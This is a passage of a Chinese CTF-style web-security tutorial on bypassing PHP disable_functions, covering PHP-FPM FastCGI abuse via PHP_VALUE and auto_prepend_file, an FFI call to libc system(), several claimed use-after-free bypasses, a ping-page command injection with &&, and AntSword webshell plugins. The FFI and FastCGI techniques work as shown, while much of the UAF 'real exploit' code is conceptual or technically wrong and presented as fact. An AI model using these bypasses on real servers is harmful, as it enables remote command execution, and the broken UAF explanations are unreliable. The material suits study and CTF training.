</code></pre></div>
<p>正常的访问流程是：<strong>浏览器 → Nginx（或 Apache） → PHP-FPM → 执行 PHP 文件</strong></p>
<p>如果我们知道 PHP-FPM 是监听在 <strong>9000 端口</strong>（默认），而且 Web 服务器没有加限制，那我们就可以**绕过 Nginx，直接用 FastCGI 协议和 FPM 通信**，就像模拟“Web 服务器”一样，直接让 FPM 执行 PHP 文件</p>
<p>前提条件如下：</p>
<p><strong>✅ 第一：你得指定一个“存在”的 PHP 文件（通过  <code>SCRIPT_FILENAME</code>）</strong></p>
<blockquote>
<p>因为 FPM 接收请求时，需要你告诉它：要执行哪个 PHP 文件？</p>
</blockquote>
<p>这就是 <code>SCRIPT_FILENAME</code> 参数的作用</p>
<ul>
<li>如果这个参数指向的文件不存在，FPM 就直接返回 404</li>
<li>所以你必须找到目标服务器上已经存在的 PHP 文件</li>
</ul>
<p><strong>💡技巧：</strong></p>
<blockquote>
<p>有时候服务器上会预装一些 PHP 示例文件，攻击者可以利用这些</p>
</blockquote>
<p><strong>✅ 第二：只能执行这个 PHP 文件？不能运行任意代码？</strong></p>
<p>就算你能控制  <code>SCRIPT_FILENAME</code>，也只能执行服务器上已有的 PHP 文件**</p>
<p>那如何实现“执行任意代码”呢？</p>
<blockquote>
<p>可以利用 PHP 的配置项：<code>auto_prepend_file</code>。</p>
</blockquote>
<p><strong>🚀 <code>auto_prepend_file</code> 是什么？</strong></p>
<p>这个配置项可以让你在执行目标 PHP 文件前，<strong>自动包含（include）一个你指定的文件</strong></p>
<p>如果我们设置它为：<code>php://input</code>，那就表示——</p>
<blockquote>
<p>在执行目标文件前，<strong>先执行我们 POST 进来的 PHP 代码</strong>！这就相当于远程执行了任意代码</p>
</blockquote>
<p><strong>✅ 第三：PHP 默认禁止了这种用法，怎么办？</strong></p>
<p>PHP 有一个配置叫：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="na">allow_url_include</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">Off</span>
</code></pre></div>
<p>如果它是  <code>Off</code>，你就不能用  <code>php://input</code>  或远程 URL 做 include</p>
<p><strong>🤯 解决办法：</strong></p>
<p>FastCGI 协议里有两个关键字段：</p>
<ul>
<li><code>PHP_VALUE</code>：设置普通的 php.ini 配置项</li>
<li><code>PHP_ADMIN_VALUE</code>：设置一些高级（受限制）的 php.ini 配置项</li>
</ul>
<p>所以我们可以直接在 FastCGI 请求中设置：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>PHP_VALUE: allow_url_include=On
</code></pre></div>
<p>再加上：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>PHP_VALUE: auto_prepend_file=php://input
</code></pre></div>
<p>这样，PHP 就会在执行前**自动执行我们构造的 payload**，从而实现远程代码执行</p>
<p>在蚁剑中 FPM/FCGI 地址这里 localhost 和 127.0.0.1 都试一试</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/688197df58cb8da5c8d30a63.png"></p>
<p>连接新的木马</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881982e58cb8da5c8d30d34.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-38.md -->
<h3 id="gc-uaf">GC UAF 提权<a class="headerlink" href="#gc-uaf" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/68819a0f58cb8da5c8d31870.png"></p>
<p>GC（Garbage Collection）机制</p>
<ul>
<li>PHP 的 GC 机制主要处理循环引用的内存释放</li>
<li>当对象之间存在循环引用时，正常的引用计数无法释放这些对象，GC 会检测并回收</li>
<li>在 PHP 5.3+ 引入的 <strong>周期性垃圾收集器</strong>（Cycle Collector）处理这类问题</li>
</ul>
<p><strong>第一步：制造 UAF 场景</strong></p>
<p>通过创建一组存在循环引用的对象，比如：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a><span class="x">class A {</span>
<a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a><span class="x">    public $ref;</span>
<a id="__codelineno-91-3" name="__codelineno-91-3" href="#__codelineno-91-3"></a><span class="x">}</span>
<a id="__codelineno-91-4" name="__codelineno-91-4" href="#__codelineno-91-4"></a><span class="x">$a = new A();</span>
<a id="__codelineno-91-5" name="__codelineno-91-5" href="#__codelineno-91-5"></a><span class="x">$b = new A();</span>
<a id="__codelineno-91-6" name="__codelineno-91-6" href="#__codelineno-91-6"></a><span class="x">$a-&gt;ref = $b;</span>
<a id="__codelineno-91-7" name="__codelineno-91-7" href="#__codelineno-91-7"></a><span class="x">$b-&gt;ref = $a;</span>
</code></pre></div>
<p>然后取消引用：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a><span class="x">unset($a, $b);</span>
</code></pre></div>
<p>这时候，两个对象形成的循环引用会被放入 GC roots 中等待清理</p>
<p>当 GC 清理这些对象时，如果其中某个对象的 <code>__destruct()</code> 方法访问了另一个已被释放的对象，就会触发 UAF</p>
<p><strong>第二步：布置恶意的析构方法</strong></p>
<p>在某个对象的 <code>__destruct()</code> 方法中调用 <strong>动态方法或魔术方法</strong>，并试图控制执行流程：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a><span class="x">class Exploit {</span>
<a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a><span class="x">    function __destruct() {</span>
<a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a><span class="x">        global $evil_payload;</span>
<a id="__codelineno-93-4" name="__codelineno-93-4" href="#__codelineno-93-4"></a><span class="x">        call_user_func($evil_payload);</span>
<a id="__codelineno-93-5" name="__codelineno-93-5" href="#__codelineno-93-5"></a><span class="x">    }</span>
<a id="__codelineno-93-6" name="__codelineno-93-6" href="#__codelineno-93-6"></a><span class="x">}</span>
</code></pre></div>
<p>在 GC 回收阶段，该方法会被调用</p>
<p><strong>第三步：内存重用 &amp; 漏洞触发</strong></p>
<p>因为 PHP 在释放内存后并不会立即清零，下次分配可能会复用该内存块</p>
<p>攻击者伪造新的对象结构或函数调用结构，劫持执行流，典型的方式包括：</p>
<ul>
<li>伪造  <code>zend_execute_data</code>  结构</li>
<li>控制  <code>call_user_func()</code>  的函数指针</li>
<li>伪造  <code>zval</code>  指向一个特定的函数调用结构</li>
</ul>
<p><strong>第四步：构造绕过 Payload，实现命令执行</strong></p>
<p>通过 UAF 劫持执行流后，攻击者构造出一个函数调用链，<strong>最终跳转到原本被禁用的函数（如 system）所在的位置</strong>，并执行命令</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a><span class="x">$func = "system"; // 被 disable_functions 禁用了</span>
<a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a><span class="x">$evil_payload = [$func, "whoami"]; // 经过 UAF 执行这段</span>
</code></pre></div>
<p>PHP 会认为是正常的回调函数，而绕过  <code>disable_functions</code>  的检查</p>
<p>蚁剑梭哈</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881a6c458cb8da5c8d35952.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-39.md -->
<h3 id="json-serializer-uaf">Json Serializer UAF 提权<a class="headerlink" href="#json-serializer-uaf" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881a89558cb8da5c8d36155.png"></p>
<p><strong>JSON 反序列化漏洞</strong></p>
<p><code>json_decode()</code>  在处理特定的对象（如实现了  <code>__wakeup()</code>  或  <code>__destruct()</code>  方法的类）时，可以触发敏感操作。如果配合弱类型比较或 UAF，可能实现利用</p>
<p><strong>步骤 1：构造触发点</strong></p>
<p>某些 PHP 内建类（如 <code>DateInterval</code>, <code>SplFileObject</code> 等）在 <strong>反序列化过程中释放内存对象</strong>，而 <strong>错误地在之后又引用了该对象</strong>，造成 UAF。例如：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a><span class="x">$json = '{"date_string":"P1D"}'; </span>
<a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a>
<a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a><span class="x"># 第一个参数 $json：要解码的 JSON 字符串</span>
<a id="__codelineno-95-4" name="__codelineno-95-4" href="#__codelineno-95-4"></a><span class="x"># 第二个参数 false：当为 false 时，返回对象；当为 true 时，返回关联数组。不过这个行为会被第四个参数覆盖</span>
<a id="__codelineno-95-5" name="__codelineno-95-5" href="#__codelineno-95-5"></a><span class="x"># 第三个参数 512：递归深度，这里是默认值</span>
<a id="__codelineno-95-6" name="__codelineno-95-6" href="#__codelineno-95-6"></a><span class="x"># 第四个参数 JSON_OBJECT_AS_ARRAY：这是一个常量，表示将 JSON 对象解码为关联数组而不是对象。这会覆盖第二个参数的行为</span>
<a id="__codelineno-95-7" name="__codelineno-95-7" href="#__codelineno-95-7"></a><span class="x">$obj = json_decode($json, false, 512, JSON_OBJECT_AS_ARRAY);</span>
</code></pre></div>
<p>在某些版本中，<code>DateInterval</code>  的解析会调用底层 C 实现的解析逻辑，释放部分内部结构后仍访问它</p>
<p><strong>步骤 2：布置内存布局</strong></p>
<p>使用 PHP 用户定义对象或数组堆喷（heap spraying）覆盖释放掉的内存，使得 UAF 指针指向攻击者可控内容</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a><span class="x">$payload = str_repeat("A", 1024); // 可控数据替换被释放的内存</span>
</code></pre></div>
<p><strong>步骤 3：伪造 zend_function 结构</strong></p>
<p>在 PHP 底层，函数指针保存在  <code>zend_function</code>  结构中。攻击者覆盖 UAF 内存，使其看起来像一个函数对象，伪造 <code>handler</code>  指向任意地址（如 libc 的 <code>system()</code>），或构造 ROP 链，最终实现执行</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>[ fake zend_function ]:
<a id="__codelineno-97-2" name="__codelineno-97-2" href="#__codelineno-97-2"></a>+0x00 handler =&gt; 0xdeadbeef (system 或 gadgets)
<a id="__codelineno-97-3" name="__codelineno-97-3" href="#__codelineno-97-3"></a>+0x08 function_name =&gt; "/bin/sh"
</code></pre></div>
<p><strong>步骤 4：调用伪函数触发执行</strong></p>
<p>通过某些魔术方法（如  <code>__destruct</code>, <code>__call</code>, <code>__invoke</code>）或特定内建函数（如  <code>call_user_func()</code>）调用伪函数，触发执行  <code>handler</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a><span class="x">call_user_func($fake_function, "/bin/sh");</span>
</code></pre></div>
<p>此时，PHP 调用的是伪造的函数对象，实质执行的是任意地址上的函数，比如 <code>system("/bin/sh")</code></p>
<p><strong>真实利用案例（概念）</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a>
<a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a><span class="k">class</span> <span class="nc">Evil</span> <span class="p">{</span>
<a id="__codelineno-99-4" name="__codelineno-99-4" href="#__codelineno-99-4"></a>    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
<a id="__codelineno-99-5" name="__codelineno-99-5" href="#__codelineno-99-5"></a>
<a id="__codelineno-99-6" name="__codelineno-99-6" href="#__codelineno-99-6"></a>    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
<a id="__codelineno-99-7" name="__codelineno-99-7" href="#__codelineno-99-7"></a>        <span class="c1">// 触发伪造函数执行</span>
<a id="__codelineno-99-8" name="__codelineno-99-8" href="#__codelineno-99-8"></a>        <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">);</span>
<a id="__codelineno-99-9" name="__codelineno-99-9" href="#__codelineno-99-9"></a>    <span class="p">}</span>
<a id="__codelineno-99-10" name="__codelineno-99-10" href="#__codelineno-99-10"></a><span class="p">}</span>
<a id="__codelineno-99-11" name="__codelineno-99-11" href="#__codelineno-99-11"></a>
<a id="__codelineno-99-12" name="__codelineno-99-12" href="#__codelineno-99-12"></a><span class="c1">// Step 1: 触发 UAF（比如某类反序列化触发）</span>
<a id="__codelineno-99-13" name="__codelineno-99-13" href="#__codelineno-99-13"></a><span class="nv">$victim</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="s1">'{"a":"..."}'</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
<a id="__codelineno-99-14" name="__codelineno-99-14" href="#__codelineno-99-14"></a>
<a id="__codelineno-99-15" name="__codelineno-99-15" href="#__codelineno-99-15"></a><span class="c1">// Step 2: 用我们控制的数据重叠释放的内存</span>
<a id="__codelineno-99-16" name="__codelineno-99-16" href="#__codelineno-99-16"></a><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<a id="__codelineno-99-17" name="__codelineno-99-17" href="#__codelineno-99-17"></a>    <span class="nv">$spray</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="s2">"A"</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
<a id="__codelineno-99-18" name="__codelineno-99-18" href="#__codelineno-99-18"></a><span class="p">}</span>
<a id="__codelineno-99-19" name="__codelineno-99-19" href="#__codelineno-99-19"></a>
<a id="__codelineno-99-20" name="__codelineno-99-20" href="#__codelineno-99-20"></a><span class="c1">// Step 3: 设置伪函数结构并执行</span>
<a id="__codelineno-99-21" name="__codelineno-99-21" href="#__codelineno-99-21"></a><span class="nv">$evil</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Evil</span><span class="p">();</span>
<a id="__codelineno-99-22" name="__codelineno-99-22" href="#__codelineno-99-22"></a><span class="nv">$evil</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">"/bin/sh"</span><span class="p">;</span> <span class="c1">// 实际指向伪函数结构</span>
</code></pre></div>
<p>蚁剑梭哈</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881ae9358cb8da5c8d38f0c.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-4.md -->
<h3 id="_9">&amp;&amp; 代替 &amp; 绕过<a class="headerlink" href="#_9" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16f87d0e0a243d4ffc162.jpg"></p>
<p>打开网页是一个执行 Ping 命令然后给回显</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16f96d0e0a243d4ffc164.jpg"></p>
<p>使用 &amp;&amp; 可以绕过，&amp;&amp; 左边命令成功执行则会执行右边的</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16fabd0e0a243d4ffc167.jpg"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-40.md -->
<h3 id="backtrace-uaf">Backtrace UAF 提权<a class="headerlink" href="#backtrace-uaf" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881c54958cb8da5c8d416c1.png"></p>
<p>PHP 的 <code>debug_backtrace()</code>  和 <code>Exception::getTrace()</code> 会在运行时生成一个调用栈（trace），包含函数、文件、行号、参数等</p>
<p>这个调用栈实际上是 <strong>zval 结构体组成的数组</strong>，包括函数指针、类名、参数指针等</p>
<p>关键点是：在构造  <code>backtrace</code> 时，PHP 会将当前的执行栈压入临时内存</p>
<p><strong>💡 1. 构造 backtrace 引发临时结构体分配</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a><span class="x">function trigger() {</span>
<a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a><span class="x">    debug_backtrace();</span>
<a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a><span class="x">}</span>
</code></pre></div>
<p>当调用 <code>debug_backtrace()</code>，PHP 会构造一个 <code>zend_execute_data</code> 结构体的快照，用于保存当前调用栈，这里面包含很多指针，如：</p>
<ul>
<li>函数名（function_name）</li>
<li>类名（class_name）</li>
<li>参数（zval 指针）</li>
<li>zend_function 指针（可能有执行函数 handler）</li>
</ul>
<p><strong>💡 2. 引发某些对象的释放（free）</strong></p>
<p>利用某些语言特性或者对象析构等方式，让一些结构体**释放掉但仍保留引用**</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a><span class="x">class A {</span>
<a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a><span class="x">    public function __destruct() {</span>
<a id="__codelineno-101-3" name="__codelineno-101-3" href="#__codelineno-101-3"></a><span class="x">        global $a;</span>
<a id="__codelineno-101-4" name="__codelineno-101-4" href="#__codelineno-101-4"></a><span class="x">        unset($a); // 引发析构</span>
<a id="__codelineno-101-5" name="__codelineno-101-5" href="#__codelineno-101-5"></a><span class="x">        debug_backtrace(); // 调用时释放对象导致悬空引用</span>
<a id="__codelineno-101-6" name="__codelineno-101-6" href="#__codelineno-101-6"></a><span class="x">    }</span>
<a id="__codelineno-101-7" name="__codelineno-101-7" href="#__codelineno-101-7"></a><span class="x">}</span>
</code></pre></div>
<p><strong>💡 3. 重新分配释放后的内存（填充 UAF）</strong></p>
<p>接下来攻击者会分配**用户可控的数据**，例如字符串、数组、对象等，来**填充已经释放的内存区域**</p>
<p>由于 PHP 使用堆内存管理机制（Zend Memory Manager），释放后的内存会被优先复用</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a><span class="x">$fake_func = str_repeat("\x41", 100); // 用 'A' 重写释放的结构体</span>
</code></pre></div>
<p>攻击者可以控制一些偏移处的内容来伪造 <code>zend_function</code>、<code>zend_execute_data</code> 等结构体，从而控制执行流</p>
<p><strong>💡 4. 利用调用堆栈中的函数指针完成控制流劫持</strong></p>
<p>在调用 backtrace 的时候，PHP 会尝试读取 <code>zend_function</code> 并调用其中的 <code>internal_function.handler</code></p>
<p>如果这个结构体是伪造的、用户可控的，那这个 handler 就变成了任意地址！</p>
<p>攻击者就可以跳转到：</p>
<ul>
<li>libc 的 <code>system()</code> 函数</li>
<li>已知地址的 shellcode</li>
<li>php-fpm 或 apache 中的其他函数地址（如 <code>execvp</code>, <code>popen</code>, 等）</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a><span class="x">class Trigger {</span>
<a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a><span class="x">    function __destruct() {</span>
<a id="__codelineno-103-3" name="__codelineno-103-3" href="#__codelineno-103-3"></a><span class="x">        debug_backtrace(); // 引发栈分配 + UAF</span>
<a id="__codelineno-103-4" name="__codelineno-103-4" href="#__codelineno-103-4"></a><span class="x">    }</span>
<a id="__codelineno-103-5" name="__codelineno-103-5" href="#__codelineno-103-5"></a><span class="x">}</span>
<a id="__codelineno-103-6" name="__codelineno-103-6" href="#__codelineno-103-6"></a>
<a id="__codelineno-103-7" name="__codelineno-103-7" href="#__codelineno-103-7"></a><span class="x">$a = new Trigger();</span>
<a id="__codelineno-103-8" name="__codelineno-103-8" href="#__codelineno-103-8"></a><span class="x">unset($a); // 引发 __destruct</span>
<a id="__codelineno-103-9" name="__codelineno-103-9" href="#__codelineno-103-9"></a>
<a id="__codelineno-103-10" name="__codelineno-103-10" href="#__codelineno-103-10"></a><span class="x">// 填充已释放内存</span>
<a id="__codelineno-103-11" name="__codelineno-103-11" href="#__codelineno-103-11"></a><span class="x">$payload = str_repeat("\x00", 0x100); // 控制结构体内容</span>
<a id="__codelineno-103-12" name="__codelineno-103-12" href="#__codelineno-103-12"></a>
<a id="__codelineno-103-13" name="__codelineno-103-13" href="#__codelineno-103-13"></a><span class="x">// 此时 handler 被劫持，跳到 system("/readflag") 等地址</span>
</code></pre></div>
<p>蚁剑插件直接梭哈</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881cf6f58cb8da5c8d46bf9.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-41.md -->
<h3 id="ffi">FFI 扩展提权<a class="headerlink" href="#ffi" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881d10458cb8da5c8d46e9a.png"></p>
<p>FFI 的本质是使用 libffi 和 dlopen/dlsym 将系统的 libc 函数绑定到 PHP，从而绕过 PHP 层的限制</p>
<p>即使 PHP 禁用了 <code>exec()</code>，攻击者仍可以通过以下流程执行系统命令：</p>
<blockquote>
<p>利用  <code>FFI::cdef()</code> ➜ 声明  <code>int system(const char *cmd)</code> ➜ 利用  FFI 找到  libc ➜ 调用  <code>system()</code></p>
</blockquote>
<p><strong>核心利用流程详解</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a><span class="c1">// 第一步：构造 C 函数声明</span>
<a id="__codelineno-104-3" name="__codelineno-104-3" href="#__codelineno-104-3"></a><span class="nv">$ffi</span> <span class="o">=</span> <span class="nx">FFI</span><span class="o">::</span><span class="na">cdef</span><span class="p">(</span>
<a id="__codelineno-104-4" name="__codelineno-104-4" href="#__codelineno-104-4"></a>    <span class="s2">"int system(const char *command);"</span><span class="p">,</span>  <span class="c1">// C 语言的函数原型</span>
<a id="__codelineno-104-5" name="__codelineno-104-5" href="#__codelineno-104-5"></a>    <span class="s2">"libc.so.6"</span>                           <span class="c1">// Linux 系统 libc 动态库</span>
<a id="__codelineno-104-6" name="__codelineno-104-6" href="#__codelineno-104-6"></a><span class="p">);</span>
<a id="__codelineno-104-7" name="__codelineno-104-7" href="#__codelineno-104-7"></a>
<a id="__codelineno-104-8" name="__codelineno-104-8" href="#__codelineno-104-8"></a><span class="c1">// 第二步：调用 system 命令</span>
<a id="__codelineno-104-9" name="__codelineno-104-9" href="#__codelineno-104-9"></a><span class="nv">$ffi</span><span class="o">-&gt;</span><span class="na">system</span><span class="p">(</span><span class="s2">"id"</span><span class="p">);</span>  <span class="c1">// 等同于 system("id");</span>
<a id="__codelineno-104-10" name="__codelineno-104-10" href="#__codelineno-104-10"></a><span class="cp">?&gt;</span>
</code></pre></div>
<ol>
<li><code>FFI::cdef()</code> 中声明了 <code>int system(const char *command);</code>；</li>
<li><code>libc.so.6</code> 是 Linux 下标准 C 函数库，包含了 <code>system()</code>；</li>
<li>调用 <code>$ffi-&gt;system("id")</code> 等同于 PHP 中的 <code>system("id")</code>；</li>
<li>即使 <code>disable_functions=system,exec,passthru</code>，这段代码仍然成功执行命令</li>
</ol>
<table>
<thead>
<tr>
<th>条件</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>PHP ≥ 7.4</td>
<td>FFI 扩展是从 PHP 7.4 开始引入的</td>
</tr>
<tr>
<td>FFI 扩展启用</td>
<td><code>php.ini</code> 中 <code>extension=ffi</code></td>
</tr>
<tr>
<td><code>ffi.enable=true</code></td>
<td>控制是否允许 FFI 功能（默认生产环境为 false）</td>
</tr>
<tr>
<td><code>disable_functions</code> 生效</td>
<td>FFI 是底层调用，不受影响</td>
</tr>
</tbody>
</table>
<p>蚁剑一键梭哈</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881d25e58cb8da5c8d47031.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-42.md -->
<h3 id="iconv">iconv 提权<a class="headerlink" href="#iconv" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881d2f758cb8da5c8d4726c.png"></p>
<p><strong>UAF 利用点：iconv 缓冲释放不当</strong></p>
<p>某些 <code>iconv_*</code> 函数（比如 <code>iconv_strlen()</code>）在处理非法字符时会触发错误流程，例如：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a><span class="x">iconv_strlen("\x80", "UTF-8");</span>
</code></pre></div>
<p>上述代码会尝试处理非法的 UTF-8 字节流，引发底层错误。但在旧版 PHP 的处理逻辑中：</p>
<ul>
<li>会先分配 buffer</li>
<li>出错时没有完全释放或释放后没有清空指针</li>
<li>下一次分配对象时可能复用了这段内存，从而导致 UAF</li>
</ul>
<p><strong>劫持对象结构</strong></p>
<p>UAF 利用的目标是劫持 PHP 的内部对象结构（如 <code>zend_object</code>），例如通过自定义类与析构逻辑：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a><span class="x">class Vuln {</span>
<a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a><span class="x">    public $a, $b;</span>
<a id="__codelineno-106-3" name="__codelineno-106-3" href="#__codelineno-106-3"></a><span class="x">    function __destruct() {</span>
<a id="__codelineno-106-4" name="__codelineno-106-4" href="#__codelineno-106-4"></a><span class="x">        global $exploit;</span>
<a id="__codelineno-106-5" name="__codelineno-106-5" href="#__codelineno-106-5"></a><span class="x">        echo $exploit;</span>
<a id="__codelineno-106-6" name="__codelineno-106-6" href="#__codelineno-106-6"></a><span class="x">    }</span>
<a id="__codelineno-106-7" name="__codelineno-106-7" href="#__codelineno-106-7"></a><span class="x">}</span>
</code></pre></div>
<p>攻击者通过：</p>
<ul>
<li>构造多个对象</li>
<li>利用 iconv 的漏洞破坏旧对象的结构</li>
<li>在同一个位置分配新的数据（如字符串），从而劫持虚拟函数指针</li>
</ul>
<p>最终可以实现类似：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a><span class="x">call_user_func($fake_function_pointer); // 任意地址执行</span>
</code></pre></div>
<p><strong>构造 fake closure 执行 system</strong></p>
<p>PHP 的 <code>Closure</code> 结构在内存中的表示是可以伪造的。例如如下伪构造：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a><span class="x">// 内存中构造 fake Closure 对象结构体，指向 zend_execute_ex -&gt; system</span>
<a id="__codelineno-108-2" name="__codelineno-108-2" href="#__codelineno-108-2"></a><span class="x">$fake_closure = "\x00" * offset . ptr_to_system;</span>
<a id="__codelineno-108-3" name="__codelineno-108-3" href="#__codelineno-108-3"></a><span class="x">$cb = unserialize($fake_closure);</span>
<a id="__codelineno-108-4" name="__codelineno-108-4" href="#__codelineno-108-4"></a><span class="x">$cb("id");</span>
</code></pre></div>
<p>通过 <code>iconv</code> 的 UAF 劫持使内存中的 closure 结构变成指向 <code>system()</code> 的执行逻辑，从而实现绕过 <code>disable_functions</code></p>
<p><strong>利用链示意</strong></p>
<pre class="mermaid"><code>flowchart TD
    A[iconv_strlen 存在 Use-After-Free] --&gt; B[释放但未清除内存]
    B --&gt; C[重新分配对象/字符串覆盖旧内存]
    C --&gt; D[伪造 zend_object 结构]
    D --&gt; E[构造 fake Closure]
    E --&gt; F[调用任意函数 system]
    F --&gt; G[绕过 disable_functions]</code></pre>
<p><strong>真实利用 POC（简化）</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a><span class="x">// 假设 iconv UAF 存在</span>
<a id="__codelineno-109-2" name="__codelineno-109-2" href="#__codelineno-109-2"></a><span class="x">iconv_strlen("\x80", "UTF-8"); // 触发释放</span>
<a id="__codelineno-109-3" name="__codelineno-109-3" href="#__codelineno-109-3"></a>
<a id="__codelineno-109-4" name="__codelineno-109-4" href="#__codelineno-109-4"></a><span class="x">class Vuln {</span>
<a id="__codelineno-109-5" name="__codelineno-109-5" href="#__codelineno-109-5"></a><span class="x">    public $cmd;</span>
<a id="__codelineno-109-6" name="__codelineno-109-6" href="#__codelineno-109-6"></a><span class="x">    function __destruct() {</span>
<a id="__codelineno-109-7" name="__codelineno-109-7" href="#__codelineno-109-7"></a><span class="x">        eval($this-&gt;cmd);</span>
<a id="__codelineno-109-8" name="__codelineno-109-8" href="#__codelineno-109-8"></a><span class="x">    }</span>
<a id="__codelineno-109-9" name="__codelineno-109-9" href="#__codelineno-109-9"></a><span class="x">}</span>
<a id="__codelineno-109-10" name="__codelineno-109-10" href="#__codelineno-109-10"></a>
<a id="__codelineno-109-11" name="__codelineno-109-11" href="#__codelineno-109-11"></a><span class="x">// 泄露 + 构造 + 劫持（省略细节）</span>
<a id="__codelineno-109-12" name="__codelineno-109-12" href="#__codelineno-109-12"></a><span class="x">$a = new Vuln();</span>
<a id="__codelineno-109-13" name="__codelineno-109-13" href="#__codelineno-109-13"></a><span class="x">$a-&gt;cmd = "system('id');";</span>
<a id="__codelineno-109-14" name="__codelineno-109-14" href="#__codelineno-109-14"></a>
